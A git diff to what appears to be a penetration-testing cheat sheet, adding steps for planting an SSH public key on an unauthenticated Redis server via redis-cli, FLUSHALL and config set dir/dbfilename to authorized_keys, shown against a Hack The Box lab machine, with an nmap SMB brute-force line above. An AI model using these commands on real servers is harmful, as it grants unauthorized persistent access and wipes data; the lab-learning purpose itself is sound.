@@ -1012,14 +1012,18 @@ nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass
 ### Redis
 
 * SSH
+
+1. Generate a ssh public-private key pair on your pc: `ssh-keygen -t rsa`
+2. Write the public key to a file : `(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`
+3. Import the file into redis : `cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key`
+4. Save the public key to the authorized_keys file on redis server:
+
 ```
 kali@bughunt3r:~/htb/machines/postman$ echo "FLUSHALL" | redis-cli -h 10.10.10.160
 OK                                                                                                        
-kali@bughunt3r:~/htb/machines/postman$ cat ~/.ssh/id_rsa.pub | redis-cli -h 10.10.10.160 -x set s-key
+kali@bughunt3r:~/htb/machines/postman$ cat ~/.ssh/id_rsa.pub | redis-cli -h 10.10.10.160 -x set ssh_key
 OK                               
 kali@bughunt3r:~/htb/machines/postman$ redis-cli -h 10.10.10.160
-10.10.10.160:6379> get s-key
-"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCq3RrdjDR90IQ6XDWbrC3z+kC5nwMJjqQwVkL376u/efZONVcKUmMh/7dBNCftrxswyR+o3MMXEp4LlC2vfCh0HVcBW3b+W/AJDxygO0nYNNhF/jyQhqpF8+lG5EVloVxj8mYEalHhJwapiJeomEoqi5x9K9KWQb5eVu8U7sgjMgjf6taloWmAnPY+Ev3C5zwweJB9/Pwe+IO2i7lis1EjGxUMDOZq+A+x+l7wjHfb167GWuPTo47o4/1NNyVZ7kBB4iHKoIFojRtpCDfUuWVFKz9OyWnUWsnXeWxTbMVy8vJO9SsYlPfi34djEB1R0g7nzeJvLmdjvzsJMiXl85nq2vdldpfzvONtyh4fYSEL5ZfBPhMZ7wpXsHVy3u2S8SJ51SfTQQe6FUsPzkThGU/ps6DHZH4ucuS+4U07vPgxgDlAL4+jWLjYhWsybMss8HOXvaTVErmgCSeSvs0nxYRZsAfZfzcG0pvEGIO6wvxRdwO2XRedBZmmIgwvP4Rb6b8= kali@bughunt3r\n"
 10.10.10.160:6379> config set dir /var/lib/redis/.ssh
 OK
 10.10.10.160:6379> config set dbfilename authorized_keys
